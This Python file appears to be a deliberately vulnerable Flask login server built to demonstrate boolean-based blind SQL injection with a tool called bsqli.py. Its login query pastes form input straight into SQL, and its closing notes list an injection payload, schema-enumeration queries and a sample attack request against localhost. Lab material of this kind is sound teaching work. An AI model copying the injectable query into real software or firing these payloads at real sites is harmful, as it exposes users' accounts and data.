# Simple Flask + SQLite demo for bsqli.py.
# 
# pip install flask
# python server.py
# 

from flask import Flask, request
import sqlite3
import random

app = Flask(__name__)

# In-memory SQLite database with dummy account information
conn = sqlite3.connect(':memory:', check_same_thread=False)
c = conn.cursor()
c.execute('''CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)''')
c.execute("INSERT INTO users (username, password) VALUES ('admin', 'adminpassword')")
c.execute('''CREATE TABLE flags (id INTEGER PRIMARY KEY, flag TEXT)''')
c.execute("INSERT INTO flags (flag) VALUES ('flag{SQL1nj3ct10n_aa9ce234d68}')")
conn.commit()

@app.route('/')
def index():
    return '''
    <h1>Welcome to the Boolean-based Blind SQL Injection Demo!</h1>
    <form method="post" action="/login">
        <label for="username">Username:</label><br>
        <input type="text" id="username" name="username"><br>
        <label for="password">Password:</label><br>
        <input type="password" id="password" name="password"><br>
        <input type="submit" value="Login">
    </form>
    '''

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']

    query = "SELECT * FROM users WHERE username='{}' AND password='{}'".format(username, password)
    c = conn.cursor()
    c.execute(query)
    user = c.fetchone()
    
    # Uncomment below lines to introduce a random error in the response.
    # if random.randint(0, 32) == 0:
    #     return 'Random error'

    if user:
        return 'Login successful!'
    else:
        return 'Login failed.'

if __name__ == '__main__':
    app.run(debug=True)







"""
./bsqli.py -u http://127.0.0.1:5000/login -X POST --data 'username=admin&password={payload}' --payload $'\'OR({cond})OR\'1\'=\'' -bttc success --dbms SQLite -t 1

TABLES
======
SELECT name
FROM sqlite_master
WHERE type='table'

SELECT COUNT(name)
FROM sqlite_master
WHERE type='table'

SELECT GROUP_CONCAT(name, ',')
FROM sqlite_master
WHERE type='table'


COLUMNS
=======
SELECT sql
FROM sqlite_master
WHERE type='table' and name='flags'


FLAG
====
SELECT flag from flags



./bsqli.py \
    -u http://127.0.0.1:5000/login \
    -X POST \
    --data 'username=admin&password={payload}' \
    --payload $'\'OR({cond})OR\'1\'=\'' \
    -bttc success \
    --dbms SQLite \
    -t 1 

```
POST /login HTTP/1.1
Host: 127.0.0.1:5000
User-Agent: ...
Connection: keep-alive

username=admin&password='OR(1=1)OR'1'='
```


"""